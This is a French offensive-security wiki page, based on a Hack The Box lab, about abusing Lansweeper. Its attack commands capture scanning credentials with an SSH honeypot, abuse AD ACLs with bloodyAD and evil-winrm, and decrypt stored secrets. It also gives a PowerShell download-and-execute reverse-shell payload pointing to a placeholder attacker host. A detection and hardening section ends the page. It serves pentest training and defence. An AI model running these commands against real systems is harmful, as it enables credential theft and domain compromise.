# Abuse de Lansweeper : Credential Harvesting, déchiffrement des secrets et RCE via Deployment

{{#include ../../banners/hacktricks-training.md}}

Lansweeper est une plateforme de découverte et d’inventaire des actifs IT, couramment déployée sur Windows et intégrée à Active Directory. Les credentials configurés dans Lansweeper sont utilisés par ses moteurs de scan pour s’authentifier auprès des actifs via des protocoles tels que SSH, SMB/WMI et WinRM. Les mauvaises configurations permettent fréquemment :

- L’interception de credentials en redirigeant une cible de scan vers un host contrôlé par l’attaquant (honeypot)
- L’exploitation des ACLs AD exposées par les groupes liés à Lansweeper afin d’obtenir un accès distant
- Le déchiffrement on-host des secrets configurés dans Lansweeper (chaînes de connexion et credentials de scan stockés)
- L’exécution de code sur les endpoints gérés via la fonctionnalité Deployment (s’exécutant souvent en tant que SYSTEM)

Cette page résume les workflows et commandes pratiques utilisés par les attaquants pour exploiter ces comportements pendant les engagements.

## 1) Harvest des credentials de scan via un honeypot (exemple SSH)

Idée : créer une Scanning Target qui pointe vers votre host et lui associer des Scanning Credentials existants. Lorsque le scan s’exécute, Lansweeper tentera de s’authentifier avec ces credentials, et votre honeypot les capturera.<sup>[[1]](#references)</sup>

Vue d’ensemble des étapes (web UI) :
- Scanning → Scanning Targets → Add Scanning Target
- Type : IP Range (ou Single IP) = votre IP VPN
- Configurer le port SSH sur une valeur accessible (par exemple, 2022 si le port 22 est bloqué)
- Désactiver la planification et prévoir un déclenchement manuel
- Scanning → Scanning Credentials → vérifier que des credentials Linux/SSH existent ; les associer à la nouvelle target (activer tout ce qui est nécessaire)
- Cliquer sur « Scan now » pour la target
- Exécuter un honeypot SSH et récupérer le username/password tenté

Exemple avec sshesame :<sup>[[2]](#references)</sup>
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Valider les identifiants capturés auprès des services du DC :
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Fonctionne de manière similaire avec d’autres protocoles lorsque vous pouvez forcer le scanner à se connecter à votre listener (honeypots SMB/WinRM, etc.). SSH est souvent le plus simple.
- De nombreux scanners s’identifient avec des client banners distincts (par ex. RebexSSH) et tenteront d’exécuter des commandes inoffensives (uname, whoami, etc.).

## 2) Abus des ACL AD : obtenir un accès distant en s’ajoutant à un groupe app-admin

Utilisez BloodHound pour énumérer les droits effectifs du compte compromis. Une découverte fréquente est un groupe spécifique au scanner ou à l’application (par ex. « Lansweeper Discovery ») disposant de GenericAll sur un groupe privilégié (par ex. « Lansweeper Admins »). Si le groupe privilégié est également membre de « Remote Management Users », WinRM devient disponible dès que nous nous y ajoutons.<sup>[[1]](#references)[[5]](#references)</sup>

Exemples de collecte :
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploiter GenericAll sur un groupe avec BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Obtenez ensuite un shell interactif :
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Astuce : les opérations Kerberos sont sensibles au temps. Si vous rencontrez KRB_AP_ERR_SKEW, synchronisez d’abord l’heure avec le DC :
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Déchiffrer les secrets configurés par Lansweeper sur l’hôte

Sur le serveur Lansweeper, le site ASP.NET stocke généralement une chaîne de connexion chiffrée et une clé symétrique utilisée par l’application. Avec un accès local approprié, vous pouvez déchiffrer la chaîne de connexion à la base de données, puis extraire les identifiants d’analyse stockés.<sup>[[1]](#references)</sup>

Emplacements courants :
- Configuration Web : `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Clé de l’application : `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Utilisez SharpLansweeperDecrypt pour automatiser le déchiffrement et le dumping des identifiants stockés :<sup>[[3]](#references)</sup>
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Le résultat attendu inclut les détails de connexion à la DB ainsi que les identifiants de scan en clair, tels que les comptes Windows et Linux utilisés dans l’ensemble du parc. Ceux-ci disposent souvent de droits locaux élevés sur les hôtes du domaine :
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Utilisez les identifiants de scan Windows récupérés pour un accès privilégié :
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

En tant que membre de « Lansweeper Admins », l’interface web expose Deployment et Configuration. Dans Deployment → Deployment packages, vous pouvez créer des packages qui exécutent des commandes arbitraires sur les assets ciblés. L’exécution est effectuée par le service Lansweeper avec des privilèges élevés, ce qui permet une exécution de code en tant que NT AUTHORITY\SYSTEM sur l’hôte sélectionné.<sup>[[1]](#references)</sup>

Étapes générales :
- Créez un nouveau Deployment package qui exécute une commande PowerShell ou cmd en une ligne (reverse shell, add-user, etc.).
- Ciblez l’asset souhaité (par exemple, le DC ou l’hôte sur lequel Lansweeper s’exécute), puis cliquez sur Deploy/Run now.
- Récupérez votre shell en tant que SYSTEM.

Exemples de payloads (PowerShell) :
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Les actions de déploiement sont bruyantes et laissent des logs dans Lansweeper et les journaux d’événements Windows. Utilisez-les avec discernement.

## Détection et hardening

- Restreignez ou supprimez les énumérations SMB anonymes. Surveillez le RID cycling et les accès anormaux aux partages Lansweeper.
- Contrôles egress : bloquez ou restreignez fortement le SSH/SMB/WinRM sortant depuis les hôtes de scan. Déclenchez des alertes sur les ports non standard (par exemple, 2022) et les bannières client inhabituelles telles que Rebex.
- Protégez `Website\\web.config` et `Key\\Encryption.txt`. Externalisez les secrets dans un vault et renouvelez-les en cas d’exposition. Envisagez des comptes de service disposant de privilèges minimaux et l’utilisation de gMSA lorsque cela est possible.
- Monitoring AD : déclenchez des alertes lors de modifications des groupes liés à Lansweeper (par exemple, “Lansweeper Admins”, “Remote Management Users”) et lors de modifications d’ACL accordant GenericAll/Write sur l’appartenance à des groupes privilégiés.
- Auditez les créations, modifications et exécutions de packages Deployment ; déclenchez des alertes lorsque des packages lancent cmd.exe/powershell.exe ou établissent des connexions sortantes inattendues.

## Sujets connexes
- Énumération SMB/LSA/SAMR et RID cycling
- Password spraying Kerberos et considérations liées au clock skew
- Analyse des chemins BloodHound des groupes application-admin
- Utilisation de WinRM et mouvement latéral

## Références
- [1] [HTB: Sweep — Abus du scanning Lansweeper, des ACL AD et des secrets pour prendre le contrôle d’un DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (honeypot SSH)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
